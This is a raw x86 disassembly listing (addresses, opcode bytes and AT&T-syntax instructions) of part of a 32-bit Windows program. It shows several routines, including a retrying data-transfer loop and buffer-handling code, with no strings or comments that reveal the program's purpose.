  402360:	3b de                	cmp    %esi,%ebx
  402362:	8b e9                	mov    %ecx,%ebp
  402364:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  40236b:	00 
  40236c:	72 4c                	jb     0x4023ba
  40236e:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  402375:	00 
  402376:	8b 85 a8 00 00 00    	mov    0xa8(%ebp),%eax
  40237c:	6a 00                	push   $0x0
  40237e:	56                   	push   %esi
  40237f:	57                   	push   %edi
  402380:	50                   	push   %eax
  402381:	ff 15 04 b4 40 00    	call   *0x40b404
  402387:	85 c0                	test   %eax,%eax
  402389:	7f 0e                	jg     0x402399
  40238b:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  40238f:	41                   	inc    %ecx
  402390:	83 f9 0f             	cmp    $0xf,%ecx
  402393:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  402397:	7c dd                	jl     0x402376
  402399:	83 7c 24 1c 0f       	cmpl   $0xf,0x1c(%esp)
  40239e:	74 50                	je     0x4023f0
  4023a0:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4023a4:	6a 0a                	push   $0xa
  4023a6:	03 c8                	add    %eax,%ecx
  4023a8:	03 fe                	add    %esi,%edi
  4023aa:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4023ae:	ff 15 c4 b0 40 00    	call   *0x40b0c4
  4023b4:	2b de                	sub    %esi,%ebx
  4023b6:	3b de                	cmp    %esi,%ebx
  4023b8:	73 b4                	jae    0x40236e
  4023ba:	85 db                	test   %ebx,%ebx
  4023bc:	7e 26                	jle    0x4023e4
  4023be:	33 f6                	xor    %esi,%esi
  4023c0:	8b 8d a8 00 00 00    	mov    0xa8(%ebp),%ecx
  4023c6:	6a 00                	push   $0x0
  4023c8:	53                   	push   %ebx
  4023c9:	57                   	push   %edi
  4023ca:	51                   	push   %ecx
  4023cb:	ff 15 04 b4 40 00    	call   *0x40b404
  4023d1:	85 c0                	test   %eax,%eax
  4023d3:	7f 06                	jg     0x4023db
  4023d5:	46                   	inc    %esi
  4023d6:	83 fe 0f             	cmp    $0xf,%esi
  4023d9:	7c e5                	jl     0x4023c0
  4023db:	83 fe 0f             	cmp    $0xf,%esi
  4023de:	74 10                	je     0x4023f0
  4023e0:	01 44 24 14          	add    %eax,0x14(%esp)
  4023e4:	8b 44 24 14          	mov    0x14(%esp),%eax
  4023e8:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4023ec:	3b c1                	cmp    %ecx,%eax
  4023ee:	74 03                	je     0x4023f3
  4023f0:	83 c8 ff             	or     $0xffffffff,%eax
  4023f3:	5f                   	pop    %edi
  4023f4:	5e                   	pop    %esi
  4023f5:	5d                   	pop    %ebp
  4023f6:	5b                   	pop    %ebx
  4023f7:	c2 0c 00             	ret    $0xc
  4023fa:	90                   	nop
  4023fb:	90                   	nop
  4023fc:	90                   	nop
  4023fd:	90                   	nop
  4023fe:	90                   	nop
  4023ff:	90                   	nop
  402400:	8b 44 24 04          	mov    0x4(%esp),%eax
  402404:	89 81 b4 00 00 00    	mov    %eax,0xb4(%ecx)
  40240a:	c2 04 00             	ret    $0x4
  40240d:	90                   	nop
  40240e:	90                   	nop
  40240f:	90                   	nop
  402410:	56                   	push   %esi
  402411:	8b f1                	mov    %ecx,%esi
  402413:	c7 06 64 b4 40 00    	movl   $0x40b464,(%esi)
  402419:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  402420:	e8 2b 74 00 00       	call   0x409850
  402425:	8b ce                	mov    %esi,%ecx
  402427:	89 46 14             	mov    %eax,0x14(%esi)
  40242a:	e8 b1 00 00 00       	call   0x4024e0
  40242f:	8d 0c 40             	lea    (%eax,%eax,2),%ecx
  402432:	89 46 10             	mov    %eax,0x10(%esi)
  402435:	c1 e1 08             	shl    $0x8,%ecx
  402438:	03 c8                	add    %eax,%ecx
  40243a:	51                   	push   %ecx
  40243b:	e8 a0 82 00 00       	call   0x40a6e0
  402440:	8b 56 10             	mov    0x10(%esi),%edx
  402443:	89 46 1c             	mov    %eax,0x1c(%esi)
  402446:	c1 e2 02             	shl    $0x2,%edx
  402449:	52                   	push   %edx
  40244a:	e8 91 82 00 00       	call   0x40a6e0
  40244f:	83 c4 08             	add    $0x8,%esp
  402452:	8b ce                	mov    %esi,%ecx
  402454:	89 46 18             	mov    %eax,0x18(%esi)
  402457:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  40245e:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
  402465:	e8 a6 05 00 00       	call   0x402a10
  40246a:	8b c6                	mov    %esi,%eax
  40246c:	5e                   	pop    %esi
  40246d:	c3                   	ret
  40246e:	90                   	nop
  40246f:	90                   	nop
  402470:	56                   	push   %esi
  402471:	8b f1                	mov    %ecx,%esi
  402473:	e8 18 00 00 00       	call   0x402490
  402478:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40247d:	74 09                	je     0x402488
  40247f:	56                   	push   %esi
  402480:	e8 61 82 00 00       	call   0x40a6e6
  402485:	83 c4 04             	add    $0x4,%esp
  402488:	8b c6                	mov    %esi,%eax
  40248a:	5e                   	pop    %esi
  40248b:	c2 04 00             	ret    $0x4
  40248e:	90                   	nop
  40248f:	90                   	nop
  402490:	56                   	push   %esi
  402491:	8b f1                	mov    %ecx,%esi
  402493:	57                   	push   %edi
  402494:	33 ff                	xor    %edi,%edi
  402496:	8b 46 10             	mov    0x10(%esi),%eax
  402499:	c7 06 64 b4 40 00    	movl   $0x40b464,(%esi)
  40249f:	85 c0                	test   %eax,%eax
  4024a1:	7e 18                	jle    0x4024bb
  4024a3:	8b 46 18             	mov    0x18(%esi),%eax
  4024a6:	8b 0c b8             	mov    (%eax,%edi,4),%ecx
  4024a9:	85 c9                	test   %ecx,%ecx
  4024ab:	74 06                	je     0x4024b3
  4024ad:	8b 11                	mov    (%ecx),%edx
  4024af:	6a 01                	push   $0x1
  4024b1:	ff 12                	call   *(%edx)
  4024b3:	8b 46 10             	mov    0x10(%esi),%eax
  4024b6:	47                   	inc    %edi
  4024b7:	3b f8                	cmp    %eax,%edi
  4024b9:	7c e8                	jl     0x4024a3
  4024bb:	8b 46 1c             	mov    0x1c(%esi),%eax
  4024be:	50                   	push   %eax
  4024bf:	e8 22 82 00 00       	call   0x40a6e6
  4024c4:	8b 46 14             	mov    0x14(%esi),%eax
  4024c7:	83 c4 04             	add    $0x4,%esp
  4024ca:	85 c0                	test   %eax,%eax
  4024cc:	5f                   	pop    %edi
  4024cd:	5e                   	pop    %esi
  4024ce:	75 08                	jne    0x4024d8
  4024d0:	6a 00                	push   $0x0
  4024d2:	e8 0f 82 00 00       	call   0x40a6e6
  4024d7:	59                   	pop    %ecx
  4024d8:	c3                   	ret
  4024d9:	90                   	nop
  4024da:	90                   	nop
  4024db:	90                   	nop
  4024dc:	90                   	nop
  4024dd:	90                   	nop
  4024de:	90                   	nop
  4024df:	90                   	nop
  4024e0:	81 ec 20 02 00 00    	sub    $0x220,%esp
  4024e6:	53                   	push   %ebx
  4024e7:	55                   	push   %ebp
  4024e8:	56                   	push   %esi
  4024e9:	57                   	push   %edi
  4024ea:	8d 44 24 20          	lea    0x20(%esp),%eax
  4024ee:	68 05 01 00 00       	push   $0x105
  4024f3:	8b f1                	mov    %ecx,%esi
  4024f5:	50                   	push   %eax
  4024f6:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4024fd:	00 
  4024fe:	ff 15 d8 b0 40 00    	call   *0x40b0d8
  402504:	68 d8 e0 40 00       	push   $0x40e0d8
  402509:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  40250d:	6a 5c                	push   $0x5c
  40250f:	51                   	push   %ecx
  402510:	ff 15 58 b2 40 00    	call   *0x40b258
  402516:	83 c4 08             	add    $0x8,%esp
  402519:	40                   	inc    %eax
  40251a:	50                   	push   %eax
  40251b:	ff 15 d4 b0 40 00    	call   *0x40b0d4
  402521:	8b 56 14             	mov    0x14(%esi),%edx
  402524:	8b 35 d0 b0 40 00    	mov    0x40b0d0,%esi
  40252a:	8d 44 24 20          	lea    0x20(%esp),%eax
  40252e:	52                   	push   %edx
  40252f:	50                   	push   %eax
  402530:	ff d6                	call   *%esi
  402532:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  402536:	68 94 e0 40 00       	push   $0x40e094
  40253b:	51                   	push   %ecx
  40253c:	ff d6                	call   *%esi
  40253e:	6a 00                	push   $0x0
  402540:	8d 94 24 2c 01 00 00 	lea    0x12c(%esp),%edx
  402547:	6a 23                	push   $0x23
  402549:	52                   	push   %edx
  40254a:	6a 00                	push   $0x0
  40254c:	ff 15 e4 b2 40 00    	call   *0x40b2e4
  402552:	8d 84 24 28 01 00 00 	lea    0x128(%esp),%eax
  402559:	68 64 e0 40 00       	push   $0x40e064
  40255e:	50                   	push   %eax
  40255f:	8d 8c 24 30 01 00 00 	lea    0x130(%esp),%ecx
  402566:	68 5c e0 40 00       	push   $0x40e05c
  40256b:	51                   	push   %ecx
  40256c:	ff 15 78 b3 40 00    	call   *0x40b378
  402572:	8d 54 24 30          	lea    0x30(%esp),%edx
  402576:	8d 84 24 38 01 00 00 	lea    0x138(%esp),%eax
  40257d:	68 00 10 00 00       	push   $0x1000
  402582:	89 54 24 2c          	mov    %edx,0x2c(%esp)
  402586:	89 44 24 30          	mov    %eax,0x30(%esp)
  40258a:	e8 51 81 00 00       	call   0x40a6e0
  40258f:	83 c4 14             	add    $0x14,%esp
  402592:	8b d8                	mov    %eax,%ebx
  402594:	8d 6c 24 18          	lea    0x18(%esp),%ebp
  402598:	c7 44 24 14 02 00 00 	movl   $0x2,0x14(%esp)
  40259f:	00 
  4025a0:	b9 00 04 00 00       	mov    $0x400,%ecx
  4025a5:	33 c0                	xor    %eax,%eax
  4025a7:	8b fb                	mov    %ebx,%edi
  4025a9:	f3 ab                	rep stos %eax,%es:(%edi)
  4025ab:	8b 4d 00             	mov    0x0(%ebp),%ecx
  4025ae:	51                   	push   %ecx
  4025af:	68 00 10 00 00       	push   $0x1000
  4025b4:	53                   	push   %ebx
  4025b5:	ff 15 cc b0 40 00    	call   *0x40b0cc
  4025bb:	8a 03                	mov    (%ebx),%al
  4025bd:	8b f3                	mov    %ebx,%esi
  4025bf:	84 c0                	test   %al,%al
  4025c1:	74 19                	je     0x4025dc
  4025c3:	8b 54 24 10          	mov    0x10(%esp),%edx
  4025c7:	56                   	push   %esi
  4025c8:	42                   	inc    %edx
  4025c9:	89 54 24 14          	mov    %edx,0x14(%esp)
  4025cd:	ff 15 c8 b0 40 00    	call   *0x40b0c8
  4025d3:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  4025d7:	80 3e 00             	cmpb   $0x0,(%esi)
  4025da:	75 e7                	jne    0x4025c3
  4025dc:	8b 44 24 14          	mov    0x14(%esp),%eax
  4025e0:	83 c5 04             	add    $0x4,%ebp
  4025e3:	48                   	dec    %eax
  4025e4:	89 44 24 14          	mov    %eax,0x14(%esp)
  4025e8:	75 b6                	jne    0x4025a0
  4025ea:	53                   	push   %ebx
  4025eb:	e8 f6 80 00 00       	call   0x40a6e6
  4025f0:	8b 44 24 14          	mov    0x14(%esp),%eax
  4025f4:	83 c4 04             	add    $0x4,%esp
  4025f7:	5f                   	pop    %edi
  4025f8:	5e                   	pop    %esi
  4025f9:	5d                   	pop    %ebp
  4025fa:	5b                   	pop    %ebx
  4025fb:	81 c4 20 02 00 00    	add    $0x220,%esp
  402601:	c3                   	ret
  402602:	90                   	nop
  402603:	90                   	nop
  402604:	90                   	nop
  402605:	90                   	nop
  402606:	90                   	nop
  402607:	90                   	nop
  402608:	90                   	nop
  402609:	90                   	nop
  40260a:	90                   	nop
  40260b:	90                   	nop
  40260c:	90                   	nop
  40260d:	90                   	nop
  40260e:	90                   	nop
  40260f:	90                   	nop
  402610:	81 ec 10 02 00 00    	sub    $0x210,%esp
  402616:	b8 00 01 00 00       	mov    $0x100,%eax
  40261b:	89 44 24 04          	mov    %eax,0x4(%esp)
  40261f:	89 44 24 08          	mov    %eax,0x8(%esp)
  402623:	8b 41 14             	mov    0x14(%ecx),%eax
  402626:	85 c0                	test   %eax,%eax
  402628:	75 07                	jne    0x402631
  40262a:	81 c4 10 02 00 00    	add    $0x210,%esp
  402630:	c3                   	ret
  402631:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  402635:	8d 54 24 08          	lea    0x8(%esp),%edx
  402639:	51                   	push   %ecx
  40263a:	8d 8c 24 14 01 00 00 	lea    0x114(%esp),%ecx
  402641:	52                   	push   %edx
  402642:	51                   	push   %ecx
  402643:	8d 54 24 10          	lea    0x10(%esp),%edx
  402647:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  40264b:	52                   	push   %edx
  40264c:	51                   	push   %ecx
  40264d:	50                   	push   %eax
  40264e:	6a 00                	push   $0x0
  402650:	ff 15 28 b0 40 00    	call   *0x40b028
  402656:	85 c0                	test   %eax,%eax
  402658:	75 07                	jne    0x402661
  40265a:	81 c4 10 02 00 00    	add    $0x210,%esp
  402660:	c3                   	ret
  402661:	8d 54 24 10          	lea    0x10(%esp),%edx
  402665:	52                   	push   %edx
  402666:	ff 15 24 b0 40 00    	call   *0x40b024
  40266c:	85 c0                	test   %eax,%eax
  40266e:	75 07                	jne    0x402677
  402670:	81 c4 10 02 00 00    	add    $0x210,%esp
  402676:	c3                   	ret
  402677:	56                   	push   %esi
  402678:	68 08 e1 40 00       	push   $0x40e108
  40267d:	ff 15 e4 b0 40 00    	call   *0x40b0e4
  402683:	8b f0                	mov    %eax,%esi
  402685:	68 f0 e0 40 00       	push   $0x40e0f0
  40268a:	56                   	push   %esi
  40268b:	ff 15 e0 b0 40 00    	call   *0x40b0e0
  402691:	85 c0                	test   %eax,%eax
  402693:	74 0c                	je     0x4026a1
  402695:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  402699:	8d 54 24 14          	lea    0x14(%esp),%edx
  40269d:	51                   	push   %ecx
  40269e:	52                   	push   %edx
  40269f:	ff d0                	call   *%eax
  4026a1:	56                   	push   %esi
  4026a2:	ff 15 dc b0 40 00    	call   *0x40b0dc
  4026a8:	8b 44 24 04          	mov    0x4(%esp),%eax
  4026ac:	5e                   	pop    %esi
  4026ad:	81 c4 10 02 00 00    	add    $0x210,%esp
  4026b3:	c3                   	ret
  4026b4:	90                   	nop
  4026b5:	90                   	nop
  4026b6:	90                   	nop
  4026b7:	90                   	nop
  4026b8:	90                   	nop
  4026b9:	90                   	nop
  4026ba:	90                   	nop
  4026bb:	90                   	nop
  4026bc:	90                   	nop
  4026bd:	90                   	nop
  4026be:	90                   	nop
  4026bf:	90                   	nop
  4026c0:	53                   	push   %ebx
  4026c1:	8b 1d c8 b0 40 00    	mov    0x40b0c8,%ebx
  4026c7:	56                   	push   %esi
  4026c8:	57                   	push   %edi
  4026c9:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4026cd:	57                   	push   %edi
  4026ce:	ff d3                	call   *%ebx
  4026d0:	8b 74 24 14          	mov    0x14(%esp),%esi
  4026d4:	d1 e0                	shl    $1,%eax
  4026d6:	66 89 06             	mov    %ax,(%esi)
  4026d9:	83 c0 02             	add    $0x2,%eax
  4026dc:	66 89 46 02          	mov    %ax,0x2(%esi)
  4026e0:	25 ff ff 00 00       	and    $0xffff,%eax
  4026e5:	50                   	push   %eax
  4026e6:	ff 15 5c b2 40 00    	call   *0x40b25c
  4026ec:	33 c9                	xor    %ecx,%ecx
  4026ee:	83 c4 04             	add    $0x4,%esp
  4026f1:	66 8b 4e 02          	mov    0x2(%esi),%cx
  4026f5:	89 46 04             	mov    %eax,0x4(%esi)
  4026f8:	51                   	push   %ecx
  4026f9:	50                   	push   %eax
  4026fa:	57                   	push   %edi
  4026fb:	ff d3                	call   *%ebx
  4026fd:	50                   	push   %eax
  4026fe:	57                   	push   %edi
  4026ff:	6a 00                	push   $0x0
  402701:	6a 00                	push   $0x0
  402703:	ff 15 e8 b0 40 00    	call   *0x40b0e8
  402709:	5f                   	pop    %edi
  40270a:	5e                   	pop    %esi
  40270b:	5b                   	pop    %ebx
  40270c:	c2 08 00             	ret    $0x8
  40270f:	90                   	nop
  402710:	83 ec 28             	sub    $0x28,%esp
  402713:	33 c0                	xor    %eax,%eax
  402715:	56                   	push   %esi
  402716:	8b f1                	mov    %ecx,%esi
  402718:	57                   	push   %edi
  402719:	b9 06 00 00 00       	mov    $0x6,%ecx
  40271e:	8d 7c 24 18          	lea    0x18(%esp),%edi
  402722:	f3 ab                	rep stos %eax,%es:(%edi)
  402724:	8d 44 24 08          	lea    0x8(%esp),%eax
  402728:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  40272c:	50                   	push   %eax
  40272d:	6a 04                	push   $0x4
  40272f:	51                   	push   %ecx
  402730:	6a 00                	push   $0x0
  402732:	e8 09 82 00 00       	call   0x40a940
  402737:	85 c0                	test   %eax,%eax
  402739:	74 0a                	je     0x402745
  40273b:	5f                   	pop    %edi
  40273c:	33 c0                	xor    %eax,%eax
  40273e:	5e                   	pop    %esi
  40273f:	83 c4 28             	add    $0x28,%esp
  402742:	c2 04 00             	ret    $0x4
  402745:	8b 44 24 34          	mov    0x34(%esp),%eax
  402749:	8d 54 24 10          	lea    0x10(%esp),%edx
  40274d:	52                   	push   %edx
  40274e:	50                   	push   %eax
  40274f:	8b ce                	mov    %esi,%ecx
  402751:	e8 6a ff ff ff       	call   0x4026c0
  402756:	8b 44 24 08          	mov    0x8(%esp),%eax
  40275a:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40275e:	8d 54 24 10          	lea    0x10(%esp),%edx
  402762:	51                   	push   %ecx
  402763:	52                   	push   %edx
  402764:	50                   	push   %eax
  402765:	e8 d0 81 00 00       	call   0x40a93a
  40276a:	85 c0                	test   %eax,%eax
  40276c:	74 0a                	je     0x402778
  40276e:	5f                   	pop    %edi
  40276f:	33 c0                	xor    %eax,%eax
  402771:	5e                   	pop    %esi
  402772:	83 c4 28             	add    $0x28,%esp
  402775:	c2 04 00             	ret    $0x4
  402778:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40277c:	51                   	push   %ecx
  40277d:	e8 b2 81 00 00       	call   0x40a934
  402782:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402786:	5f                   	pop    %edi
  402787:	f7 d8                	neg    %eax
  402789:	1b c0                	sbb    %eax,%eax
  40278b:	5e                   	pop    %esi
  40278c:	f7 d0                	not    %eax
  40278e:	23 c1                	and    %ecx,%eax
  402790:	83 c4 28             	add    $0x28,%esp
  402793:	c2 04 00             	ret    $0x4
  402796:	90                   	nop
  402797:	90                   	nop
  402798:	90                   	nop
  402799:	90                   	nop
  40279a:	90                   	nop
  40279b:	90                   	nop
  40279c:	90                   	nop
  40279d:	90                   	nop
  40279e:	90                   	nop
  40279f:	90                   	nop
  4027a0:	81 ec 0c 05 00 00    	sub    $0x50c,%esp
  4027a6:	53                   	push   %ebx
  4027a7:	55                   	push   %ebp
  4027a8:	56                   	push   %esi
  4027a9:	8b b4 24 20 05 00 00 	mov    0x520(%esp),%esi
  4027b0:	33 db                	xor    %ebx,%ebx
  4027b2:	57                   	push   %edi
  4027b3:	53                   	push   %ebx
  4027b4:	8b e9                	mov    %ecx,%ebp
  4027b6:	8b 8c 24 24 05 00 00 	mov    0x524(%esp),%ecx
  4027bd:	53                   	push   %ebx
  4027be:	8d 84 24 24 01 00 00 	lea    0x124(%esp),%eax
  4027c5:	81 e6 ff ff 00 00    	and    $0xffff,%esi
  4027cb:	68 00 04 00 00       	push   $0x400
  4027d0:	50                   	push   %eax
  4027d1:	56                   	push   %esi
  4027d2:	51                   	push   %ecx
  4027d3:	53                   	push   %ebx
  4027d4:	53                   	push   %ebx
  4027d5:	88 5c 24 3c          	mov    %bl,0x3c(%esp)
  4027d9:	ff 15 fc b1 40 00    	call   *0x40b1fc
  4027df:	d1 ee                	shr    $1,%esi
  4027e1:	83 c6 fe             	add    $0xfffffffe,%esi
  4027e4:	33 ff                	xor    %edi,%edi
  4027e6:	33 d2                	xor    %edx,%edx
  4027e8:	33 c0                	xor    %eax,%eax
  4027ea:	3b f3                	cmp    %ebx,%esi
  4027ec:	89 7c 24 14          	mov    %edi,0x14(%esp)
  4027f0:	89 74 24 18          	mov    %esi,0x18(%esp)
  4027f4:	0f 8e 24 01 00 00    	jle    0x40291e
  4027fa:	8a 8c 3c 1c 01 00 00 	mov    0x11c(%esp,%edi,1),%cl
  402801:	3a cb                	cmp    %bl,%cl
  402803:	0f 85 fc 00 00 00    	jne    0x402905
  402809:	42                   	inc    %edx
  40280a:	8b ca                	mov    %edx,%ecx
  40280c:	49                   	dec    %ecx
  40280d:	0f 84 a0 00 00 00    	je     0x4028b3
  402813:	83 e9 05             	sub    $0x5,%ecx
  402816:	74 65                	je     0x40287d
  402818:	49                   	dec    %ecx
  402819:	0f 85 cf 00 00 00    	jne    0x4028ee
  40281f:	88 5c 04 1c          	mov    %bl,0x1c(%esp,%eax,1)
  402823:	8b 45 08             	mov    0x8(%ebp),%eax
  402826:	8d 7c 24 1c          	lea    0x1c(%esp),%edi
  40282a:	8d 0c 40             	lea    (%eax,%eax,2),%ecx
  40282d:	c1 e1 08             	shl    $0x8,%ecx
  402830:	03 c8                	add    %eax,%ecx
  402832:	8b 45 1c             	mov    0x1c(%ebp),%eax
  402835:	8d b4 01 00 01 00 00 	lea    0x100(%ecx,%eax,1),%esi
  40283c:	83 c9 ff             	or     $0xffffffff,%ecx
  40283f:	33 c0                	xor    %eax,%eax
  402841:	89 74 24 10          	mov    %esi,0x10(%esp)
  402845:	f2 ae                	repnz scas %es:(%edi),%al
  402847:	f7 d1                	not    %ecx
  402849:	2b f9                	sub    %ecx,%edi
  40284b:	8b c1                	mov    %ecx,%eax
  40284d:	8b f7                	mov    %edi,%esi
  40284f:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402853:	c1 e9 02             	shr    $0x2,%ecx
  402856:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402858:	8b c8                	mov    %eax,%ecx
  40285a:	83 e1 03             	and    $0x3,%ecx
  40285d:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40285f:	8b 45 08             	mov    0x8(%ebp),%eax
  402862:	8d 0c 40             	lea    (%eax,%eax,2),%ecx
  402865:	c1 e1 08             	shl    $0x8,%ecx
  402868:	03 c8                	add    %eax,%ecx
  40286a:	8b 45 1c             	mov    0x1c(%ebp),%eax
  40286d:	88 9c 01 00 03 00 00 	mov    %bl,0x300(%ecx,%eax,1)
  402874:	8b 45 08             	mov    0x8(%ebp),%eax
  402877:	40                   	inc    %eax
  402878:	89 45 08             	mov    %eax,0x8(%ebp)
  40287b:	eb 71                	jmp    0x4028ee
  40287d:	88 5c 04 1c          	mov    %bl,0x1c(%esp,%eax,1)
  402881:	8b 45 08             	mov    0x8(%ebp),%eax
  402884:	8d 7c 24 1c          	lea    0x1c(%esp),%edi
  402888:	8d 0c 40             	lea    (%eax,%eax,2),%ecx
  40288b:	c1 e1 08             	shl    $0x8,%ecx
  40288e:	03 c8                	add    %eax,%ecx
  402890:	8b 45 1c             	mov    0x1c(%ebp),%eax
  402893:	8d b4 01 00 02 00 00 	lea    0x200(%ecx,%eax,1),%esi
  40289a:	83 c9 ff             	or     $0xffffffff,%ecx
  40289d:	33 c0                	xor    %eax,%eax
  40289f:	89 74 24 10          	mov    %esi,0x10(%esp)
  4028a3:	f2 ae                	repnz scas %es:(%edi),%al
  4028a5:	f7 d1                	not    %ecx
  4028a7:	2b f9                	sub    %ecx,%edi
  4028a9:	8b f7                	mov    %edi,%esi
  4028ab:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4028af:	8b c1                	mov    %ecx,%eax
  4028b1:	eb 2f                	jmp    0x4028e2
  4028b3:	88 5c 04 1c          	mov    %bl,0x1c(%esp,%eax,1)
  4028b7:	8b 45 08             	mov    0x8(%ebp),%eax
  4028ba:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  4028bd:	8d 7c 24 1c          	lea    0x1c(%esp),%edi
  4028c1:	8d 34 40             	lea    (%eax,%eax,2),%esi
  4028c4:	c1 e6 08             	shl    $0x8,%esi
  4028c7:	03 f0                	add    %eax,%esi
  4028c9:	33 c0                	xor    %eax,%eax
  4028cb:	03 f1                	add    %ecx,%esi
  4028cd:	83 c9 ff             	or     $0xffffffff,%ecx
  4028d0:	f2 ae                	repnz scas %es:(%edi),%al
  4028d2:	f7 d1                	not    %ecx
  4028d4:	2b f9                	sub    %ecx,%edi
  4028d6:	89 74 24 10          	mov    %esi,0x10(%esp)
  4028da:	8b f7                	mov    %edi,%esi
  4028dc:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4028e0:	8b c1                	mov    %ecx,%eax
  4028e2:	c1 e9 02             	shr    $0x2,%ecx
  4028e5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4028e7:	8b c8                	mov    %eax,%ecx
  4028e9:	83 e1 03             	and    $0x3,%ecx
  4028ec:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4028ee:	8b 74 24 18          	mov    0x18(%esp),%esi
  4028f2:	b9 40 00 00 00       	mov    $0x40,%ecx
  4028f7:	33 c0                	xor    %eax,%eax
  4028f9:	8d 7c 24 1c          	lea    0x1c(%esp),%edi
  4028fd:	f3 ab                	rep stos %eax,%es:(%edi)
  4028ff:	8b 7c 24 14          	mov    0x14(%esp),%edi
  402903:	eb 05                	jmp    0x40290a
  402905:	88 4c 04 1c          	mov    %cl,0x1c(%esp,%eax,1)
  402909:	40                   	inc    %eax
  40290a:	83 fa 09             	cmp    $0x9,%edx
  40290d:	75 02                	jne    0x402911
  40290f:	33 d2                	xor    %edx,%edx
  402911:	47                   	inc    %edi
  402912:	3b fe                	cmp    %esi,%edi
  402914:	89 7c 24 14          	mov    %edi,0x14(%esp)
  402918:	0f 8c dc fe ff ff    	jl     0x4027fa
  40291e:	5f                   	pop    %edi
  40291f:	5e                   	pop    %esi
  402920:	5d                   	pop    %ebp
  402921:	5b                   	pop    %ebx
  402922:	81 c4 0c 05 00 00    	add    $0x50c,%esp
  402928:	c2 08 00             	ret    $0x8
  40292b:	90                   	nop
  40292c:	90                   	nop
  40292d:	90                   	nop
  40292e:	90                   	nop
  40292f:	90                   	nop
  402930:	81 ec 30 01 00 00    	sub    $0x130,%esp
  402936:	53                   	push   %ebx
  402937:	8b d9                	mov    %ecx,%ebx
  402939:	8b 0d 38 e1 40 00    	mov    0x40e138,%ecx
  40293f:	56                   	push   %esi
  402940:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  402944:	66 8b 0d 44 e1 40 00 	mov    0x40e144,%cx
  40294b:	57                   	push   %edi
  40294c:	66 89 4c 24 1c       	mov    %cx,0x1c(%esp)
  402951:	b9 06 00 00 00       	mov    $0x6,%ecx
  402956:	be 18 e1 40 00       	mov    $0x40e118,%esi
  40295b:	8d 7c 24 20          	lea    0x20(%esp),%edi
  40295f:	a1 34 e1 40 00       	mov    0x40e134,%eax
  402964:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402966:	8b 15 3c e1 40 00    	mov    0x40e13c,%edx
  40296c:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402970:	a1 40 e1 40 00       	mov    0x40e140,%eax
  402975:	89 54 24 14          	mov    %edx,0x14(%esp)
  402979:	8a 15 46 e1 40 00    	mov    0x40e146,%dl
  40297f:	8b cb                	mov    %ebx,%ecx
  402981:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  402983:	89 44 24 18          	mov    %eax,0x18(%esp)
  402987:	88 54 24 1e          	mov    %dl,0x1e(%esp)
  40298b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40298c:	e8 7f fc ff ff       	call   0x402610
  402991:	50                   	push   %eax
  402992:	8d 44 24 10          	lea    0x10(%esp),%eax
  402996:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  40299a:	50                   	push   %eax
  40299b:	51                   	push   %ecx
  40299c:	ff 15 78 b3 40 00    	call   *0x40b378
  4029a2:	83 c4 0c             	add    $0xc,%esp
  4029a5:	8d 54 24 3c          	lea    0x3c(%esp),%edx
  4029a9:	8b cb                	mov    %ebx,%ecx
  4029ab:	52                   	push   %edx
  4029ac:	e8 5f fd ff ff       	call   0x402710
  4029b1:	8b f0                	mov    %eax,%esi
  4029b3:	85 f6                	test   %esi,%esi
  4029b5:	74 18                	je     0x4029cf
  4029b7:	66 8b 06             	mov    (%esi),%ax
  4029ba:	8b 4e 04             	mov    0x4(%esi),%ecx
  4029bd:	50                   	push   %eax
  4029be:	51                   	push   %ecx
  4029bf:	8b cb                	mov    %ebx,%ecx
  4029c1:	e8 da fd ff ff       	call   0x4027a0
  4029c6:	8b 56 04             	mov    0x4(%esi),%edx
  4029c9:	52                   	push   %edx
  4029ca:	e8 77 7f 00 00       	call   0x40a946
  4029cf:	8d 44 24 20          	lea    0x20(%esp),%eax
  4029d3:	8b cb                	mov    %ebx,%ecx
  4029d5:	50                   	push   %eax
  4029d6:	e8 35 fd ff ff       	call   0x402710
  4029db:	8b f0                	mov    %eax,%esi
  4029dd:	85 f6                	test   %esi,%esi
  4029df:	74 18                	je     0x4029f9
  4029e1:	66 8b 0e             	mov    (%esi),%cx
  4029e4:	8b 56 04             	mov    0x4(%esi),%edx
  4029e7:	51                   	push   %ecx
  4029e8:	52                   	push   %edx
  4029e9:	8b cb                	mov    %ebx,%ecx
  4029eb:	e8 b0 fd ff ff       	call   0x4027a0
  4029f0:	8b 46 04             	mov    0x4(%esi),%eax
  4029f3:	50                   	push   %eax
  4029f4:	e8 4d 7f 00 00       	call   0x40a946
